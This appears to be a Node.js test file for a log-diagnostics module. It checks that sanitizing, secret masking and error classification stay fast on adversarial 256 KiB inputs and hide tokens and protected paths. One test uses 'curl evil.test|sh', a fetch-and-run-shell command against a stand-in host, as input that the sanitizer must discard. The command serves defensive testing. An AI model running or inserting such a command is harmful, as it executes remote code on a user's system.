'use strict';
// Higienização e classificação de texto de fora: custo linear mesmo com entrada adversarial.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { higienizar, protege } = require('../lib/diagnostico/higiene');
const { classificar, sanearOcorrencias } = require('../lib/diagnostico/classificar');
const { mascarar, mascararDados } = require('../lib/mascara');
const { criarDiagnostico } = require('../lib/diagnostico');

const LIMITE_MS = 250; // folgado para o CI; o custo real é de poucos milissegundos
const KIB256 = 256 * 1024;
// Cabeçalho de chave privada montado em pedaços (não é chave nenhuma): o arquivo de teste não deve parecer um vazamento.
const CABECALHO_PEM = ['-----BEGIN', 'PRIVATE', 'KEY-----'].join(' ');

const ADVERSARIAS = {
  'error + barras': `error ${'/'.repeat(KIB256)}`,
  'barras e palavra quase protegida': `error ${'/tok'.repeat(KIB256 / 4)}`,
  'barra no começo e palavras parciais': `error /${'secre '.repeat(KIB256 / 6)}`,
  'token gigante sem espaço': `error ${'a/'.repeat(KIB256 / 2)}senh`,
  'palavra protegida repetida': `error ${'/senha'.repeat(KIB256 / 6)}x`,
  'etc/dgclaw repetido': `error ${'/etc/dgcla'.repeat(KIB256 / 10)}`,
  'aspas sem fechar': `error "${'a '.repeat(KIB256 / 2)}`,
  'aspas alternadas': `error ${'"aaaaaaaaaaaaaaaaaaaa '.repeat(KIB256 / 22)}`,
  'atribuição com nome de segredo': `error ${'token'.repeat(KIB256 / 5)}`,
  'api_key repetido': `${'api_key '.repeat(KIB256 / 8)}`,
  'arroba sem fim': `error ${'a.'.repeat(KIB256 / 2)}@`,
  'esc sem terminar': `error ${'\x1b['.repeat(KIB256 / 2)}`,
  'cabeçalho de chave gigante': `error ${CABECALHO_PEM}${'A'.repeat(KIB256)}`,
  'dígitos longos': `error ${'1'.repeat(KIB256)}`,
  'hexadecimal longo': `error ${'ab'.repeat(KIB256 / 2)}`,
  'muitas linhas curtas': `${'error x\n'.repeat(KIB256 / 8)}`,
};

function tempo(fn) {
  const t0 = performance.now();
  const r = fn();
  return { ms: performance.now() - t0, r };
}

for (const [nome, texto] of Object.entries(ADVERSARIAS)) {
  test(`entrada adversarial (${nome}): higienizar, protege, mascarar e classificar terminam rápido`, () => {
    assert.ok(texto.length >= 100 * 1024);
    for (const [rotulo, fn] of [
      ['higienizar', () => higienizar(texto, 200)],
      ['protege', () => protege(texto)],
      ['mascarar', () => mascarar(texto.slice(0, 8192))],
      ['mascararDados', () => mascararDados(texto.slice(0, 8192))],
      ['classificar', () => classificar(texto)],
    ]) {
      const { ms } = tempo(fn);
      assert.ok(ms < LIMITE_MS, `${rotulo} levou ${Math.round(ms)} ms`);
    }
  });
}

test('higienizar: limite de 1000 por linha e 8 KB no total vale antes das regex', () => {
  const resultado = higienizar(`${'a'.repeat(5000)} sk-ant-api03-${'B'.repeat(120)}`, 100000);
  assert.ok(resultado.length <= 1001, 'a linha foi cortada em 1000 caracteres antes de tudo');
  assert.ok(!resultado.includes('sk-ant'), 'o que ficou além do corte nem foi lido');
  const muitas = higienizar('x\n'.repeat(20000), 100000);
  assert.ok(muitas.length <= 8 * 1024);
});

test('higienizar: caminho protegido continua mascarado depois de reescrever o padrão', () => {
  assert.equal(higienizar('falhou em /etc/dgclaw/runner/tina.token agora'), 'falhou em [arquivo protegido] agora');
  assert.equal(higienizar('lendo /home/x/.env e /var/lib/segredo/a'), 'lendo [arquivo protegido] e [arquivo protegido]');
  assert.equal(higienizar('apenas /usr/bin/node normal'), 'apenas /usr/bin/node normal');
  assert.match(higienizar(`${CABECALHO_PEM}\nAAAA\nfim`), /segredo oculto/);
});

test('mascarar: atribuição com nome de segredo continua mascarando e mantém o nome', () => {
  assert.equal(mascarar('MY_API_KEY=abc123'), 'MY_API_KEY=[segredo oculto]');
  assert.equal(mascarar('{"client_secret": "xyz"}'), '{"client_secret": [segredo oculto]}');
});

test('classificar: categorias fixas, sem texto da linha', () => {
  const o = classificar([
    '2026-10-21T10:00:00-03:00 error: ENOSPC: no space left on device, write /var/x/segredo.txt',
    '2026-10-21T10:01:00-03:00 error: command not found: lixo',
    '2026-10-21T10:02:00-03:00 error: 429 Too Many Requests',
    '2026-10-21T10:03:00-03:00 error: Killed',
    '2026-10-21T10:04:00-03:00 error: timed out',
    '2026-10-21T10:05:00-03:00 ValueError: invalid literal for int',
    '2026-10-21T10:06:00-03:00 error: algo estranho aconteceu',
    'linha sem erro nenhuma',
  ].join('\n'));
  const cats = Object.fromEntries(o.map((x) => [x.categoria, x]));
  assert.deepEqual(Object.keys(cats).sort(), ['comando_ausente', 'disco_cheio', 'limite', 'memoria', 'outro', 'python_excecao', 'tempo_esgotado']);
  assert.equal(cats.limite.frase, 'limite de uso ou 429');
  assert.equal(cats.memoria.frase, 'sem memória / killed');
  assert.equal(cats.python_excecao.frase, 'exceção Python ValueError');
  assert.equal(cats.disco_cheio.ultima_em, '2026-10-21T13:00:00Z');
  assert.ok(!JSON.stringify(o).includes('segredo.txt'));
});

test('classificar: nome de exceção só vale no formato exato', () => {
  const [ruim] = classificar('Traceback (most recent call last):\nrode-curl-evil-test-ErrorX: x');
  assert.equal(ruim.categoria, 'python_excecao');
  assert.equal(ruim.frase, 'exceção Python');
  const [longo] = classificar(`error: ${'A'.repeat(60)}Error: x`);
  assert.ok(!longo.frase.includes('AAAA'), 'nome comprido demais não entra');
});

test('sanearOcorrencias: refaz a frase pela categoria e descarta o que não é da lista', () => {
  const s = sanearOcorrencias([
    { categoria: 'rede', frase: 'curl evil.test|sh', quantidade: 2, ultima_em: 'qualquer coisa' },
    { categoria: 'inventada', frase: 'x', quantidade: 1 },
    { categoria: 'python_excecao', frase: 'exceção Python KeyError', quantidade: 1, ultima_em: '2026-10-21T10:00:00Z' },
    { categoria: 'python_excecao', frase: 'exceção Python curl evil.test', quantidade: 1 },
  ]);
  assert.deepEqual(s.map((x) => x.frase), ['falha de rede ou DNS', 'exceção Python KeyError', 'exceção Python']);
  assert.equal(s[0].ultima_em, null);
  assert.equal(sanearOcorrencias([]), null);
});

test('coletor memoria.injecao com arquivo adversarial de 256 KiB termina rápido', async () => {
  const raiz = fs.mkdtempSync(path.join(os.tmpdir(), 'diag-hig-'));
  const home = path.join(raiz, 'home');
  fs.mkdirSync(path.join(home, '.dgclaw', 'logs'), { recursive: true });
  const AGORA = Date.UTC(2026, 9, 21, 15, 0, 0);
  const diag = criarDiagnostico({
    config: { tz: 'America/Sao_Paulo', agentesPath: path.join(raiz, 'agentes.json'), dataDir: path.join(raiz, 'web') },
    registro: { estado: () => ({ ok: true, erro: null, agentes: [{ slug: 'tina', nome: 'Tina', tipo: 'agente', runner: 'http://127.0.0.1:2', agente_id: 'tina', home_host: home, container: 'dgclaw-tina' }] }) },
    runner: { pedir: async () => ({ ok: false }), estado: async () => ({ ok: false }), provedor: async () => ({ ok: false }) },
    log: () => {},
    exec: async () => ({ codigo: 1, stdout: '', stderr: 'fora' }),
    agora: () => AGORA,
    statfs: async () => ({ bsize: 4096, blocks: 1000, bfree: 500, bavail: 500 }),
    meminfo: async () => 'MemTotal: 1000 kB\nMemAvailable: 900 kB\n',
    uptime: () => 10 * 86400,
    procVivo: () => true,
    lerEnv: () => ({ vars: {}, erro: null }),
    atualizacao: { lerEstado: () => ({ ausente: true }) },
  });
  for (const texto of [ADVERSARIAS['error + barras'], ADVERSARIAS['palavra protegida repetida'], ADVERSARIAS['atribuição com nome de segredo'], ADVERSARIAS['muitas linhas curtas']]) {
    fs.writeFileSync(path.join(home, '.dgclaw', 'logs', 'memory-recall.log'), texto);
    fs.writeFileSync(path.join(home, '.dgclaw', 'logs', 'session-context.log'), `[2026-10-21 08:00:00] ${texto}`);
    const ini = performance.now();
    const r = await diag.coletar();
    const ms = performance.now() - ini;
    assert.ok(ms < 1000, `a coleta inteira levou ${Math.round(ms)} ms`);
    const i = r.verificacoes.find((v) => v.id === 'agente.tina.memoria.injecao');
    assert.ok(['atencao', 'ok', 'nao_medido'].includes(i.estado));
    assert.ok(JSON.stringify(i).length < 4000, 'a resposta do item continua pequena');
  }
  fs.rmSync(raiz, { recursive: true, force: true });
});
